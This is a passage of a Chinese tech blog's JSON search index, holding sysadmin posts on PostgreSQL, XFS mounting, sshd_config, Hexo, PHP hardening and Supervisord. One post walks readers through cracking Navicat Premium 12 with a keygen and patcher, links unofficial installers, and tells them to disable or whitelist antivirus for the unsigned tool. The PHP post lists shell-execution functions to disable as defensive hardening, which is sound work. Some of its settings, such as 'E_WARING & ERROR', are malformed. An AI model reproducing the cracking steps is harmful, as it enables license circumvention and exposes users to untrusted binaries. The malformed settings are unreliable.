username WITH PASSWORD 'password';\n$ CREATE DATABASE dbname;\n$ GRANT ALL PRIVILEGES ON DATABASE dbname TO username;\n$ ALTER SCHEMA public OWNER to username;\n$ alter database dbname set timezone='PRC';\n```","tags":["数据库"],"categories":["数据库"]},{"title":"记一次xfs文件系统重复uuid挂载磁盘","url":"/posts/c63c1ddf/","content":"\n# 记一次xfs文件系统重复uuid挂载磁盘\n\n\n\n>**摘要：**\n>**CentOS 7开始默认文件系统是xfs，CentOS 6是ext4，CentOS 5是ext3，xfs是一种非常优秀的日志文件系统,它是SGI公司设计的。xfs被称为业界最先进的、最具可升级性的文件系统技术，xfs是一个64位文件系统,最大支持8EB减1字节的单个文件系统,实际部署时取决于宿主操作系统的最大块限制。对于一个32位Linux系统,文件和文件系统的大小会被限制在16TB，xfs在很多方面确实做的比ext4好,ext4受限制于磁盘结构和兼容问题,可扩展性和scalability确实不如xfs,另外xfs经过很多年发展,各种锁的细化做的也比较好。** \n\n----------\n\n<!-- more -->\n##  正文\n``` bash\n# 事情前提是这样子的\n# 我公司一个运维，把SSH搞垮了，就是配置文件瞎改，重启失败后不还原还kill我ssh进程，导致服务器无法连接也错过了黄金救援时间，重启服务器也无果，因为你服务器ssh服务都凉了\n# 所幸的是我们用的是aws的ec2，因为没有拍快照所以只能通过土办法，通过管理控制面板挂载宕机的磁盘到新的服务器\n# 但是挂载的时候出现了uuid一样，无法挂载的问题，修改uuid也失败，可能是aws的问题。\n\n# 报错\n# XFS: Filesystem sdb7 has duplicate UUID - can't mount\n# 执行命令\n$ mount -o nouuid /dev/sdb7 /data/disk_backup/sdb7 \n# 这样子就挂载成功了，还有读写权限，你就可以修复或者是恢复你服务器\n\n# 查看uuid\n# 命令1\n$ blkid\n# 命令2 \n$ ls -l /dev/disk/by-uuid\n\n# 修改uuid\n# 命令1\n$ sudo uuidgen | xargs tune2fs /dev/sda5 -U\n# 命令2\n$ tune2fs -U c1b9d5a2-f162-11cf-9ece-0020afc76f16 /dev/sda5\n# 命令3:使用xfs_admin实用程序为次分区生成新的uuid\n$ xfs_admin -U generate /dev/sdb7\n\n# 再次奉劝各位核心服务配置要锁好，有行为管理系统最好做策略，也多让你的员工遵守运维守则和规范，不然损失公司财产，还得背锅\n```","tags":["磁盘管理"],"categories":["磁盘管理"]},{"title":"linux下sshd配置文件说明","url":"/posts/884130ab/","content":"\n# Linux下sshd配置文件说明\n\n\n\n>**注明：很多人可能不知道ssh和sshd有什么区别，在这里我给大家讲解一下他们的区别，ssh通常是客户端，sshd是服务端，一般我们连接Linux则需要配置Linux的sshd配置文件，这样我们才能连接服务器。** \n\n----------\n<!-- more -->\n\n##  sshd配置文件\n``` dsconfig\n#\t$OpenBSD: sshd_config,v 1.100 2016/08/15 12:32:04 naddy Exp $\n\n# This is the sshd server system-wide configuration file.  See\n# sshd_config(5) for more information.\n\n# This sshd was compiled with PATH=/usr/local/bin:/usr/bin\n\n# The strategy used for options in the default sshd_config shipped with\n# OpenSSH is to specify options with their default value where\n# possible, but leave them commented.  Uncommented options override the\n# default value.\n\n# If you want to change the port on a SELinux system, you have to tell\n# SELinux about this change.\n# semanage port -a -t ssh_port_t -p tcp #PORTNUMBER  #SELinux配置SSH端口\n#\n#Port 22  #监听的服务器端口\n#AddressFamily any  #any表示同时监听iPv4和iPv6地址\n#ListenAddress 0.0.0.0  #监听iPv4地址\n#ListenAddress ::  #监听iPv6地址\n\nHostKey /etc/ssh/ssh_host_rsa_key  #SSH所使用的RSA私钥路径\n#HostKey /etc/ssh/ssh_host_dsa_key  #SSH所使用的DSA私钥路径\nHostKey /etc/ssh/ssh_host_ecdsa_key  #SSH所使用的ECDSA私钥路径\nHostKey /etc/ssh/ssh_host_ed25519_key  #SSH所使用的ED25519私钥路径\n\n# Ciphers and keying\n#RekeyLimit default none\n\n# Logging\n#SyslogFacility AUTH\nSyslogFacility AUTHPRIV  #设置在记录来自sshd的消息的时候，是否给出\"Facility code\"\n#LogLevel INFO  #日志记录级别\n\n# Authentication:\n\n#LoginGraceTime 2m  #限定用户认证时间为2分钟\nPermitRootLogin no  #是否允许root账号SSH登录，生成环境最好禁止root登录\n#StrictModes yes  #设置SSH在接受登陆请求之前，是否检查用户根目录和rhosts文件的权限和所有权，建议开启\n#MaxAuthTries 6  #指定每个链接最大允许的认证次数，默认值是6\n#MaxSessions 10  #最大允许保持多少个连接，默认值是10\n\n#PubkeyAuthentication yes  #是否开启公钥验证\n\n# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2\n# but this is overridden so installations will only check .ssh/authorized_keys\nAuthorizedKeysFile .ssh/authorized_keys  #公钥验证文件路径\n\n#AuthorizedPrincipalsFile none\n\n#AuthorizedKeysCommand none\n#AuthorizedKeysCommandUser nobody\n\n# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts\n#HostbasedAuthentication no\n# Change to yes if you don't trust ~/.ssh/known_hosts for\n# HostbasedAuthentication  #指定服务器在使用 ~/.shosts ~/.rhosts /etc/hosts.equiv进行远程主机名匹配时，是否进行反向域名查询\n#IgnoreUserKnownHosts no  #是否在 RhostsRSAAuthentication 或 HostbasedAuthentication 过程中忽略用户的 ~/.ssh/known_hosts 文件\n# Don't read the user's ~/.rhosts and ~/.shosts files\n#IgnoreRhosts yes  #是否在 RhostsRSAAuthentication 或 HostbasedAuthentication 过程中忽略 .rhosts 和 .shosts 文件\n\n# To disable tunneled clear text passwords, change to no here!\n#PasswordAuthentication yes  #是否启用密码登录验证，建议使用秘钥登录\n#PermitEmptyPasswords no  #是否允许空密码\n\n\n# Change to no to disable s/key passwords\n#ChallengeResponseAuthentication yes\nChallengeResponseAuthentication no  #是否允许质疑-应答(challenge-response)认证\n\n# Kerberos options\n#KerberosAuthentication no #是否使用Kerberos认证\n#KerberosOrLocalPasswd yes  #如果 Kerberos 密码认证失败，那么该密码还将要通过其它的认证机制(比如 /etc/passwd)\n#KerberosTicketCleanup yes  #是否在用户退出登录后自动销毁用户的 ticket\n#KerberosGetAFSToken no  #如果使用了AFS并且该用户有一个 Kerberos 5 TGT，那么开启该指令后，将会在访问用户的家目录前尝试获取一个AFS token\n#KerberosUseKuserok yes\n\n# GSSAPI options\nGSSAPIAuthentication yes    #是否允许基于GSSAPI的用户认证\nGSSAPICleanupCredentials no  #是否在用户退出登录后自动销毁用户凭证缓存\n#GSSAPIStrictAcceptorCheck yes\n#GSSAPIKeyExchange no\n#GSSAPIEnablek5users no\n\n# Set this to 'yes' to enable PAM authentication, account processing,\n# and session processing. If this is enabled, PAM authentication will\n# be allowed through the ChallengeResponseAuthentication and\n# PasswordAuthentication.  Depending on your PAM configuration,\n# PAM authentication via ChallengeResponseAuthentication may bypass\n# the setting of \"PermitRootLogin without-password\".\n# If you just want the PAM account and session checks to run without\n# PAM authentication, then enable this but set PasswordAuthentication\n# and ChallengeResponseAuthentication to 'no'.\n# WARNING: 'UsePAM no' is not supported in Red Hat Enterprise Linux and may cause several\n# problems.\nUsePAM yes  #是否通过PAM验证\n\n#AllowAgentForwarding yes\n#AllowTcpForwarding yes\n#GatewayPorts no  #是否允许远程主机连接本地的转发端口\nX11Forwarding yes  #是否允许X11转发\n#X11DisplayOffset 10  #指定sshd（8）X11转发的第一个可用的显示区(display)数字。默认值是10\n#X11UseLocalhost yes  #是否应当将X11转发服务器绑定到本地loopback地址\n#PermitTTY yes\n#PrintMotd yes  #指定sshd(8)是否在每一次交互式登录时打印 /etc/motd 文件的内容\n#PrintLastLog yes  #指定sshd(8)是否在每一次交互式登录时打印最后一位用户的登录时间\n#TCPKeepAlive yes  #指定系统是否向客户端发送 TCP keepalive 消息\n#UseLogin no  #是否在交互式会话的登录过程中使用 login（1）\n#UsePrivilegeSeparation sandbox  #是否让 sshd(8) 通过创建非特权子进程处理接入请求的方法来进行权限分离\n#PermitUserEnvironment no  #指定是否允许sshd(8)处理~/.ssh/environment以及 ~/.ssh/authorized_keys中的 environment= 选项\n#Compression delayed  #是否对通信数据进行加密，还是延迟到认证成功之后再对通信数据加密\n#ClientAliveInterval 0  #sshd(8)长时间没有收到客户端的任何数据，不发送\"alive\"消息\n#ClientAliveCountMax 3  #sshd(8)在未收到任何客户端回应前最多允许发送多个\"alive\"消息，默认值是 3\n#ShowPatchLevel no\nUseDNS no  #是否使用dns反向解析\n#PidFile /var/run/sshd.pid  #指定存放SSH守护进程的进程号的路径\n#MaxStartups 10:30:100  #最大允许保持多少个未认证的连接\n#PermitTunnel no  #是否允许tun(4)设备转发\n#ChrootDirectory none\n#VersionAddendum none\n\n# no default banner path\n#Banner none  #将这个指令指定的文件中的内容在用户进行认证前显示给远程用户，默认什么内容也不显示，\"none\"表示禁用这个特性\n\n# Accept locale-related environment variables\nAcceptEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES\nAcceptEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT\nAcceptEnv LC_IDENTIFICATION LC_ALL LANGUAGE\nAcceptEnv XMODIFIERS\n\n# override default of no subsystems\nSubsystem sftp\t/usr/libexec/openssh/sftp-server  #配置一个外部子系统sftp及其路径\n\n# Example of overriding settings on a per-user basis\n#Match User anoncvs  #引入一个条件块。块的结尾标志是另一个 Match 指令或者文件结尾    \n#\tX11Forwarding no\n#\tAllowTcpForwarding no\n#\tPermitTTY no\n#\tForceCommand cvs server\n\n\n```","tags":["SSH"],"categories":["SSH"]},{"title":"Navicat Premium 12安装与激活","url":"/posts/89585e27/","content":"\n# Navicat Premium 12安装与激活\n\n\n\n>**声明：本文所提供的软件均来自互联网下载，本教程只是作为一个分享和学习使用方法，请勿用于商业用途避免不必要的麻烦，下载后请与24小时内删除，请支持正版！** \n\n----------\n<!-- more -->\n\n## 下载\n\n>- **本文提供链接不保证时效性，如果链接失效请自行解决**\n>- **[Navicat Premium 12](https://www.navicat.com.cn/)** 是一套非常强大的数据库开发管理工具，支持连接 MySQL、Oracle、PostgreSQL等多种数据库，可以快速轻松地创建、管理和维护数据库。\n>- **[官方下载](https://www.navicat.com.cn/download/navicat-premium)** 注意的是目前12.1.11之后版本已经不能激活，新的激活办法我还在寻找中，请下载12.1.11版本的程序\n\n### 12.1.11版本程序下载(Navicat for Windows)\n> [Navicat Premium 12.1.11 简体中文64位](https://www.lanzous.com/i2mobkj)\n> [Navicat Premium 12.1.11 简体中文32位](https://www.lanzous.com/i2mjlkj)\n> [Navicat Premium 12.1.11 英文64位](https://www.lanzous.com/i2moc0f)\n> [Navicat Premium 12.1.11 英文32位](https://www.lanzous.com/i2mocaf)\n\n##  安装\n> 安装比较简单，先下载好，然后双击安装，然后下一步自己配置程序安装选项到最后安装完成即可\n> ![image](https://static-hk.gov-cn.cn/static/images/89585e27/image-1.png)\n> ![image](https://static-hk.gov-cn.cn/static/images/89585e27/image-2.png)\n\n##  激活\n#### 激活工具下载\n**若曾安装过Navicat Premium且多次激活失败，请先卸载已安装的Navicat Premium并清理文件残留和注册表残留，重启电脑，再次尝试激活。**\n\n> **适用于Navicat Premium 12.1.x和12.0.x版本：**\n> [Navicat Premium 12.0.x & 12.1.x 注册机](https://www.lanzous.com/i2omkra)\n\n**重要提示：该注册机来源于[DeltaFoX](https://dfox.it/DeFconX/files/file/79-navicat-software/)[（GitHub）](https://github.com/Deltafox79/Navicat_Keygen)。一般来说，由于注册机会修改.exe文件或.dll文件，加壳并且没有数字签名，所以杀毒软件会报毒，自行决定是否使用本注册机。如需使用本注册机或者下载后找不到文件，需要关闭杀毒软件或将本注册机添加至杀毒软件白名单。**\n>**备用方案：**命令行激活工具，来自[Github](https://github.com/DoubleLabyrinth/navicat-keygen)，分别适用于Windows和Mac。请仔细阅读README.md进行操作。\n\n#### 激活\n>**以管理员身份运行此注册机：**\n正常是可以打开的，如果你弹出初始化错误，那你是 .NET Framework 没有安装\n![image](https://static-hk.gov-cn.cn/static/images/89585e27/image-3.png)\n**打开注册机后，第一步选择1) Patch勾选Backup、Host和Navicat v12，然后点击Patch按钮：**\n![image](https://static-hk.gov-cn.cn/static/images/89585e27/image-4.png)\n**点击path按钮之后，选择你安装的路径，选择完成后弹出信息框：**\n![image](https://static-hk.gov-cn.cn/static/images/89585e27/image-5.png)\n**第二步选择2) License. Product and Language勾选你对应的版本，例如我的是Navicat Premium中文版：**\n![image](https://static-hk.gov-cn.cn/static/images/89585e27/image-6.png)\n**第三步选择4) - Keygen / Offline Activation填写Your Name和Your Organization选项，然后点击Generate按钮生成Serial Keygen**\n![image](https://static-hk.gov-cn.cn/static/images/89585e27/image-7.png)\n**第四步打开Navicat Premium 12如果你是刚安装的就会弹出信息框，我们点击注册**\n![image](https://static-hk.gov-cn.cn/static/images/89585e27/image-8.png)\n**然后输入我们的注册机生成的Serial Keygen**\n![image](https://static-hk.gov-cn.cn/static/images/89585e27/image-9.png)\n**然后会弹出一个激活服务器暂时不可使用，然后我们点击手动激活**\n![image-10](https://static-hk.gov-cn.cn/static/images/89585e27/image-10.png)\n**弹出这个手动激活信息框，我们把请求码复制到激活工具的Request Code栏点击Generate把获得的代码放到激活码栏目，激活即可**\n![image](https://static-hk.gov-cn.cn/static/images/89585e27/image-11.png)\n![image](https://static-hk.gov-cn.cn/static/images/89585e27/image-12.png)\n![image](https://static-hk.gov-cn.cn/static/images/89585e27/image-13.png)\n>至此我们激活就成功了，如果你打开没有弹出注册框，你可以打开软件，点击帮助栏的注册，进行注册，注册的步骤跟上面一样\n![image](https://static-hk.gov-cn.cn/static/images/89585e27/image-14.png)\n\n----\n","tags":["数据库"],"categories":["数据库"]},{"title":"Hexo环境部署及配置","url":"/posts/58b88d7f/","content":"\n# Hexo环境部署及配置\n\n\n**前言：** \n\n- **部署Hexo** - 其实部署*Hexo*环境还是很快速的，一个Nodejs+Git就能构架起你的Hexo环境\n- **配置** -  弄过的人都知道，最麻烦的就是配置，搞都能搞半个小时那种，就是安装3分钟，配置半小时\n- **迁移** - 其实说过来，部署几分钟就完事，配置也就一次的事情，如果你换了电脑环境，你总不可能在重新配置吧，所以我们需要做的就是迁移，这样就不用很麻烦的去在配置一次了，你只要记得你的模块插件都有拿一些，后面的事情就省去很多步骤\n\n----------\n<!-- more -->\n\n\n## 环境部署\n\n> 这边主要给大家看的就是Windows下部署Hexo，平时就是本地写博客然后利用Hexo生成静态上传到Github然后展示给大家看，这样子就免去了很大的一个维护成本，Github是完全免费的开源的代码托管平台，我们就不需要买什么服务器，然后部署环境等等这些步骤\n\n### 安装Nodejs\n##### Windows for Nodejs\n 点击下载 [Nodejs for Windows](https://nodejs.org/zh-cn/) \n##### Mac for Nodejs\n点击下载 [Nodejs for Mac](https://nodejs.org/en/download/) 或使用homebrew安装 ：`brew install node`\n##### Linux\n`yum -y install node`\n`apt-get install nodejs`\n\n---\n### 安装Git\n##### Windows for Git\n 点击下载 [Git for Windows](https://git-scm.com/download/win) \n##### Mac for Git\n点击下载 [Git for Mac](https://git-scm.com/download/mac) 或使用homebrew安装 ：`brew install git`\n##### Linux\n`yum -y install git`\n`apt-get install git`\n\n---\n### 初始化Hexo环境\n##### 安装Hexo\n``` bash\n# 创建一个文件夹,例如：C:/Blog/,然后右键鼠标菜单点Git Bash Here\n# 查看你的Git和Nodejs是否安装成功\n$ npm -v\n$ git --version\n# 安装Hexo环境\n$ npm install hexo-cli -g\n# 测试是否安装成功\n$ hexo --version\n# 显示出相关版本信息就代表安装成功了\n```\n\n#### 初始化博客\n\\# 创建一个文件夹,例如：C:/Blog/,然后右键鼠标菜单点Git Bash Here\n\\# 初始化博客\n`$ hexo init <blogfile>`\n\\# 结果如下\n![image](https://static-hk.gov-cn.cn/static/images/58b88d7f/image-1.png)\n\\# 安装Hexo需要的插件\n`$ cd <blogfile>`\n`$ npm install`\n![image](https://static-hk.gov-cn.cn/static/images/58b88d7f/image-2.png)\n\\# 至此你的环境就初始化完成了,执行`$ hexo server`然后访问`localhost:4000`即可访问你初始化的目录\n![image](https://static-hk.gov-cn.cn/static/images/58b88d7f/image-3.png)\n\n---\n\n### 配置Hexo\n#### 配置Hexo+Github\n\\# 首先我们先创建一个Github的项目\n![image](https://static-hk.gov-cn.cn/static/images/58b88d7f/image-4.png)\n\\# 然后你就看得到你的项目了，首先你要配置你的SSH秘钥，选择全局设置-SSH and GPG Keys然后选择new SSH key\n![image](https://static-hk.gov-cn.cn/static/images/58b88d7f/image-5.png)\n\\# 获取秘钥`ssh-keygen -t rsa -C \"your's email address\" `\n![image](https://static-hk.gov-cn.cn/static/images/58b88d7f/image-6.png)\n\\# 你的秘钥在你C盘用户目录的`.ssh`目录下，然后复制到你的Github\n![image](https://static-hk.gov-cn.cn/static/images/58b88d7f/image-7.png)\n![image](https://static-hk.gov-cn.cn/static/images/58b88d7f/image-8.png)\n\\# 秘钥复制上去之后呢，在配置你的Git全局配置\n`$ git config --global user.name \"Your's name\"`\n`$ git config --global user.email \"Your's email address\"`\n![image](https://static-hk.gov-cn.cn/static/images/58b88d7f/image-9.png)\n\\# 测试你的秘钥是否能登录Github，出现Hi 你的用户名就代表成功了\n`$ ssh -T git@github.com`\n![image](https://static-hk.gov-cn.cn/static/images/58b88d7f/image-10.png) \n\\# 启动GitHub Pages，这是一个Github上面的一个网站项目，这样子hexo编译到github的页面就会被解析成网站\n![image](https://static-hk.gov-cn.cn/static/images/58b88d7f/image-11.png) \n\\# 然后修改hexo的全局配置文件_config.yml的deploy选项，修改\n```\n# Deployment\n## Docs: https://hexo.io/docs/deployment.html\ndeploy:\n  type: git\n  repository: 你创建的项目git地址\n  branch: master\n```\n![image](https://static-hk.gov-cn.cn/static/images/58b88d7f/image-12.png) \n\\# 上传代码到Github查看你的新网站吧\n`$ hexo g -d`\n\n#### 配置主题模板、炫酷的样式等操作\n**关于主题模板、样式等操作我就不一一演示，我这边推荐一个链接，包含了很多配置：[hexo的next主题个性化教程:打造炫酷网站](https://www.jianshu.com/p/f054333ac9e6)**","tags":["Hexo"],"categories":["Hexo"]},{"title":"PHP配置文件优化实践","url":"/posts/15df6ea1/","content":"\n## PHP配置文件优化实践\n\n---\n\n**以下配置有参考到 [php.ini-配置文件详解](http://www.thinkphp.cn/code/1444.html) ，以及 [php-fpm.conf & php.ini 安全优化实践](https://klionsec.github.io/2017/11/23/phpsec/)**\n\n\n------\n\n### 部署服务\n\n##### 前提工作\n<!-- more -->\n``` bash\n# 前提工作\n$ php -v  #更新前查看当前PHP版本避免重复更新\n$ yum list installed | grep php  #检查当前PHP的安装包\n$ yum remove php*  #卸载当前PHP安装包\n\n# PHP软件源\n# CentOS 6.x\n$ rpm -Uvh http://mirror.webtatic.com/yum/el6/latest.rpm\n# CentOS 7.x\n$ rpm -Uvh https://mirror.webtatic.com/yum/el7/epel-release.rpm\n$ rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm\n# 如果安装报错error: Failed dependencies:epel-release >= 7 is needed by webtatic-release-7-3.noarch\n# 则需要安装epel-release\n$ yum install epel-release -y  #yum安装epel-release\n$ rpm -ivh http://dl.fedoraproject.org/pub/epel/7/x86_64/e/epel-release-7-5.noarch.rpm  #rpm安装epel-release\n# 安装完成在重新安装php软件源\n```\n\n##### 安装PHP\n``` bash\n#查看yum源是否有php72w安装包\n$ yum list php72w\n\n# 安装php及相关插件\n# 安装php7.0\n$ yum install -y php70w.x86_64 php70w-cli.x86_64 php70w-common.x86_64 php70w-gd.x86_64 php70w-ldap.x86_64 php70w-mbstring.x86_64 php70w-mcrypt.x86_64 php70w-mysql.x86_64 php70w-pdo.x86_64 php70w-fpm\n\n# 安装php7.1\n$ yum install -y php71w-fpm php71w-opcache php71w-cli php71w-gd php71w-imap php71w-mysqlnd php71w-mbstring php71w-mcrypt php71w-pdo php71w-pecl-apcu php71w-pecl-mongodb php71w-pecl-redis php71w-pgsql php71w-xml php71w-xmlrpc php71w-devel mod_php71w\n\n# 安装php7.2\n$ yum install -y php72w-fpm php72w-opcache php72w-cli php72w-gd php72w-imap php72w-mysqlnd php72w-mbstring php72w-pdo php72w-pecl-apcu php72w-pecl-mongodb php72w-pecl-redis php72w-pgsql php72w-xml php72w-xmlrpc php72w-devel mod_php72w\n\n# 查看当前php版本\n$ php -v\n\n# 开启php-fpm服务\n$ systemctl enable php-fpm\n$ systemctl start php-fpm\n```\n\n### 配置服务\n\n##### php-fpm.conf\n``` dsconfig\n# php-fpm的全局配置模块\n[global]\n\n# 指定php-fpm的进程id文件存放位置\npid = /var/run/php-fpm/php-fpm.pid\n\n# 指定php-fpm进程自身错误日志存放位置\nerror_log = /var/log/php-fpm/error.log\n\n# 指定记录php-fpm的日志等级\nlog_level = error\n\n# 后台进程启动\ndaemonize = yes\n\n# 打开文件描述符限制\nrlimit_files = 65535\n\n# 使用处理event事件机制\nevents.mechanism = epoll\n# select     (any POSIX os)\n# poll       (any POSIX os)\n# epoll      (linux >= 2.5.44)\n# kqueue     (FreeBSD >= 4.1, OpenBSD >= 2.9, NetBSD >= 2.0)\n\ninclude=/etc/php-fpm.d/*.conf\n\n```\n\n##### php-fpm.d/www.conf\n``` dsconfig\n# php-fpm的web配置模块\n[www]\n\n# php-fpm进程用户和组\n# 最好把web服务用户和php-fpm进程用户权限分开，分别用两个完全不同的系统伪用户来跑对应服务，防止意外的越权行为\nuser = php\ngroup = php\n\n# 监听端口\nlisten = 127.0.0.1:9000\nlisten.owner = php\nlisten.group = php\n# 允许FastCGI客户端连接的IPv4地址，多个地址用','分隔，为空则允许任何地址发来链接请求\nlisten.allowed_clients = 127.0.0.1\n\n# 2种方式（Static/Dynamic）静态/动态，选择进程池管理器如何控制子进程的数量\npm = dynamic\n\n# 同一时刻能够存货的最大子进程的数量\npm.max_children = 1024\n\n# 在启动时启动的子进程数量\npm.start_servers = 16\n\n# 处于空闲\"idle\"状态的最小子进程，如果空闲进程数量小于这个值，那么相应的子进程会被创建\npm.min_spare_servers = 5\n\n# 最大空闲子进程数量，空闲子进程数量超过这个值，那么相应的子进程会被杀掉。\npm.max_spare_servers = 20\n\n# 派生新的子进程前，每一个子进程应该处理的请求数目，在第三方库中解决内存溢出很有用，设置为0则不会限制\npm.max_requests = 2048\n\n# 配置一个URI，以便查看fpm状态页\n# 请谨慎打开，打开请设置可访问的权限避免暴露\npm.status_path = /status\n\n# 用于记录慢请求\nslowlog = /var/log/php-fpm/www-slow.log\n\n# 慢日志请求超时时间，对一个php程序进行跟踪。\nrequest_slowlog_timeout = 10\n\n# 限制FPM执行解析的扩展名\nsecurity.limit_extensions = .php\n\n\n```\n\n##### php.ini\n``` dsconfig\n[PHP]\n\n# 是否启用PHP解析引擎\nengine = On\n\n# 是否使用简介标志\nshort_open_tag = Off\n\n# 浮点型数据显示的有效期\nprecision = 14\n\n# 输出缓冲区大小(字节)，建议值为4096~8192\noutput_buffering = 4096\n\n# 是否开启zlib输出压缩\nzlib.output_compression = Off\n\n# 是否要求PHP输出层在每个输出块之后自动刷新数据\nimplicit_flush = Off\n\n# 将浮点型和双精度型数据序列化存储时的精度(有效位数)。默认值能够确保浮点型数据被解序列化程序解码时不会丢失数据。\nserialize_precision = 17\n\n# 限制php对本地文件系统的访问\nopen_basedir = \"/data/servers/webapps:/var/www/\"\n\n# 禁用各种高危函数\ndisable_functions = dl,eval,assert,popen,proc_close,gzinflate,str_rot13,base64_decode,exec,system,ini_alter,readlink,symlink,leak,proc_open,pope,passthru,chroot,scandir,chgrp,chown,escapeshellcmd,escapeshellarg,shell_exec,proc_get_status,max_execution_time,opendir,readdir,chdir,dir,unlink,delete,copy,rename,ini_set,phpinfo,pcntl-fork,create_function\n\nzend.enable_gc = On\n\n# 隐藏php的详细版本号\nexpose_php = Off\n\n# 限制php单脚本执行时长,防止服务器资源被长期滥用而产生拒绝服务的效果\n#每个脚本最大执行秒数\nmax_execution_time = 30\n#每个脚本用来分析请求数据的最大限制时间\nmax_input_time = 60\n  #每个脚本执行的内存限制\nmemory_limit = 8M\n\n# 设置php的错误报告级别,只需要报告警告和错误即可\nerror_reporting = E_WARING & ERROR\n\n# 切记千万不让让php错误输出到前端页面上\ndisplay_errors = Off\n\n# 另外,不要把php启动过程中的错误输出到前端页面上\ndisplay_startup_errors = Off\n\n# 开启php错误日志记录\nlog_errors = On\n\n# 指定php错误日志的最大长度\nlog_errors_max_len = 2048\n\n# 不要忽略重复的错误\nignore_repeated_errors = Off\n\n# 打开后当记录重复的信息时忽略来源\nignore_repeated_source = Off\n\n# 报告内存泄露，仅在debug编译模式下有效\nreport_memleaks = On\n\n# 在$php_errormsg中保存最后一次错误/警告消息 (逻辑值).永远不要再生产环境中使用此特性：html_errors 会显示php错误所在的html标签\ntrack_errors = Off\n\n# 是否开启静态网页错误提示\nhtml_errors = On\n\n# 指定php错误日志存放位置\nerror_log = php_errors.log\n\n\n# 此指令描述了PHP注册GET,POST,Cookie,环境和内置变量的顺序(各自使用G,P,C,E和S,一般使用EGPCS或GPC).注册使用从左往右的顺序,新的值会覆盖旧的值.\nvariables_order = \"GPCS\"\n\n# 此指令描述的顺序PHP注册GET，POST和COOKIE变量_REQUEST数组。注册是由左到右，新的值将覆盖旧值。如果这个指令没有设置，variables_order中使用$_REQUEST内容。请注意，默认分配的php.ini文件中不包含’C’饼干，出于安全方面的考虑。\nrequest_order = \"GP\"\n\n# 此指令让PHP确认是否申明 argv&argc 变量 (这些变量会包含GET信息). ;如果你不使用这些变量,为了提升性能应该关闭此选项。\nregister_argc_argv = Off\n\n# 当打开此项, SERVER 和 ENV 变量将在第一次被使用时而不是脚本一开始时创建(运行时);如果这些变量在脚本中没有被使用过, 打开此项会增加一点性能.;为了使此指令有效,PHP指令 register_globals, register_long_arrays,;以及 register_argc_argv 必须被关闭.\nauto_globals_jit = On\n\n# 通过POST表单给php的所能接收的文件大小最多为多少\npost_max_size = 8M\n\n# PHP内建默认为text/html\ndefault_mimetype = \"text/html\"\n\n\ndefault_charset = \"UTF-8\"\n\n# 是否允许使用dl()函数。dl()函数仅在将PHP作为apache模块安装时才有效。禁用dl()函数主要是出于安全考虑，因为它可以绕过open_basedir指令的限制。在安全模式下始终禁用dl()函数，而不管此处如何设置。\nenable_dl = Off\n\n# 默认cgi.fix_pathinfo 项是开启的,即值为1,它会对文件路径自动进行修正,我们要把它改成0,不要让php自动修正文件路径,防止入侵者利用此特性构造解析漏洞来配合上传webshell\ncgi.fix_pathinfo = 0 \n\n# 开启php上传功能，如果实际业务根本不涉及到上传直接把上传功能关掉即可\nfile_uploads = On\n\n# 文件传上来的临时存放目录\nupload_tmp_dir = /data/servers/webapps/tmp_uploads\n\n# 允许上传文件的文件大小最大为多少 \nupload_max_filesize = 8M\n\n# 最大同时可以上传20个文件\nmax_file_uploads = 20\n\n# 是否允许打开远程文件\n# 为On时,则表示允许,也就是说,此时可以通过file_get_contents(),include(),require()等函数直接从远端获取数据\n# 容易造成任意文件读取和包含问题,注意,此项默认就是开启的\nallow_url_fopen = Off\n\n# 是否允许include/require远程文件，容易造成远程包含,强烈建议关闭此项\t\t\nallow_url_include = Off\n\n# 默认的socket超时时间\ndefault_socket_timeout = 60\n\n[browscap]\n# 修改session文件存放路径,最好不要直接放在默认的/tmp目录下,实际中可能是一台单独的session服务器,比如,memcached\n[Session]\nsession.save_handler = memcache\nsession.save_path = \"tcp://192.168.1.101:11211\"\n\n#php的是PHPSESSID,jsp的则是JSESSIONID\nsession.name = PHPSESSID\n\n\n```\n**小结：关于配置方面已经基本介绍完成，服务安全是我们不可去忽略的，我们要多去关注官方的高危补丁，定期升级软件，最后以上全部参数基本都可以用于实战部署，但并不是所有的参数配置都是必须的，具体请根据实际情况来进行调整和定制，有些地方都是根据我实际建议来考量的，并不一定完全是对的，如果你有更好的方案，欢迎投稿。**\n**我是Beytagh Stark，座右铭：唯一不变的就是一直在变**","tags":["PHP"],"categories":["PHP"]},{"title":"Linux下使用Supervisord管理服务","url":"/posts/4ca8fc53/","content":"\n## Linux下使用Supervisord管理服务\n\n---\n\n点击进入 [Supervisord官方网站](http://supervisord.org)\n\n------\n\n### 部署Supervisord\n\n##### 安装Supervisord\n<!-- more -->\n``` bash\n# pip安装\n$ pip install supervisor\n\n# 其他安装\n$ su -c 'curl https://download.mono-project.com/repo/centos7-stable.repo | tee /etc/yum.repos.d/mono-centos7-stable.repo' \n$ yum install mono-devel -y \n$ yum install python-setuptools -y \n$ easy_install supervisor \n```\n\n##### 配置Supervisord\n``` bash\n# 生成配置文件\n$ echo_supervisord_conf > /etc/supervisord.conf\n\n# 使用Systemd管理Supervisord服务\n$ cat > /usr/lib/systemd/system/supervisord.service << EOF\n[Unit]\nDescription=supervisord - Supervisor process control system for UNIX\nDocumentation=http://supervisord.org\nAfter=network.target\n\n[Service]  \nType=forking\nExecStart=/usr/bin/supervisord -c /etc/supervisord.conf\nExecReload=/usr/bin/supervisorctl reload\nExecStop=/usr/bin/supervisorctl shutdown \n#User=root\nKillMode=process\nRestart=on-failure\nRestartSec=50s \n\n[Install]\nWantedBy=multi-user.target\nEOF\n```\n\n##### 编辑Supervisord需要管理的服务\n**例如我需要Supervisord管理我的一个微服务api_server**\n**微服务存放在/data/servers/apiapps/，启动方式是api_server server**\n``` bash\n$ vim /data/config/supervisor/api_server.conf\n# 编辑一个配置文件然后添加以下内容，实际使用情况请根据自己决定在修改\n[program:api_server]  #这里就是后面启动服务关闭服务的名字，这里api_server就是我的服务\ndirectory=/data/servers/apiapps/\ncommand=/data/servers/apiapps/api_server 